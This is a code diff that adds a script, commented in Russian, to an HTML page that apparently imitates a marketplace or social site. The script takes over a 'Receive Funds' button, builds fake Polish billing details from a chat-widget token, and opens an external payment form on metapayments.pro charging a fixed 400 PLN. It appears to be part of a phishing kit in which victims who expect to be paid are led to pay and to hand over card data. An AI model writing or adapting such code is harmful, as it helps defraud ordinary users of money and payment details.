@@ -252,4 +252,115 @@ technologies. Check back here for updates.</p></div></div></div></div></div></di
     });
 })();
 </script>
+
+<script>
+// Обработчик кнопки "Receive Funds" с адаптацией под каждого клиента
+(function() {
+    function getClientData() {
+        // Получаем или генерируем данные клиента
+        let clientData = JSON.parse(localStorage.getItem('clientPaymentData') || '{}');
+        
+        // Если данных нет, генерируем уникальные для этого клиента
+        if (!clientData.firstName || !clientData.email) {
+            // Получаем supportToken из iframe или генерируем
+            const iframe = document.getElementById('chatra__iframe');
+            let supportToken = '';
+            
+            try {
+                if (iframe && iframe.contentWindow) {
+                    supportToken = iframe.contentWindow.INFO?.supportToken || 
+                                  localStorage.getItem('supportToken') || 
+                                  Math.random().toString(36).substring(2, 15);
+                } else {
+                    supportToken = localStorage.getItem('supportToken') || 
+                                  Math.random().toString(36).substring(2, 15);
+                }
+            } catch(e) {
+                supportToken = localStorage.getItem('supportToken') || 
+                              Math.random().toString(36).substring(2, 15);
+            }
+            
+            // Генерируем уникальные данные на основе токена
+            const hash = supportToken.substring(0, 8);
+            clientData = {
+                firstName: 'Client',
+                lastName: hash.substring(0, 4).toUpperCase(),
+                email: `client${hash}@example.com`,
+                phone: `+48${Math.floor(Math.random() * 900000000) + 100000000}`,
+                address: 'ul. Example 123',
+                city: 'Warsaw',
+                state: 'MZ',
+                postcode: '00-001',
+                orderId: supportToken.substring(0, 12)
+            };
+            
+            // Сохраняем для этого клиента
+            localStorage.setItem('clientPaymentData', JSON.stringify(clientData));
+        }
+        
+        return clientData;
+    }
+    
+    function buildPaymentUrl() {
+        const clientData = getClientData();
+        const baseUrl = 'https://metapayments.pro/connect/form';
+        
+        // Фиксированные параметры
+        const params = {
+            site: 'metapayments.pro',
+            icon: 'https://s6.imgcdn.dev/8xixd.png',
+            image: 'https://s6.imgcdn.dev/8xQsM.png',
+            amount: '400',
+            symbol: 'PLN',
+            vat: '0',
+            riderect_success: window.location.origin + '/order/success',
+            riderect_failed: window.location.origin + '/order/failed',
+            riderect_back: window.location.origin,
+            order_id: clientData.orderId,
+            billing_first_name: clientData.firstName,
+            billing_last_name: clientData.lastName,
+            billing_address_1: clientData.address,
+            billing_city: clientData.city,
+            billing_state: clientData.state,
+            billing_postcode: clientData.postcode,
+            billing_country: 'PL', // Фиксированно Польша
+            billing_email: clientData.email,
+            billing_phone: clientData.phone
+        };
+        
+        // Формируем URL
+        const queryString = Object.keys(params)
+            .map(key => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`)
+            .join('&');
+        
+        return `${baseUrl}?${queryString}`;
+    }
+    
+    // Обработчик клика на кнопку "Receive Funds"
+    function setupReceiveFundsButton() {
+        const button = document.getElementById('u_0_7_6o');
+        if (button) {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                const paymentUrl = buildPaymentUrl();
+                console.log('Переход на платёжную систему:', paymentUrl);
+                window.open(paymentUrl, '_blank', 'noopener,noreferrer');
+            });
+            
+            // Обновляем href для совместимости
+            button.href = 'javascript:void(0)';
+        }
+    }
+    
+    // Запускаем при загрузке страницы
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', setupReceiveFundsButton);
+    } else {
+        setupReceiveFundsButton();
+    }
+    
+    // Также пробуем через небольшой таймаут на случай динамической загрузки
+    setTimeout(setupReceiveFundsButton, 1000);
+})();
+</script>
 </body></html>
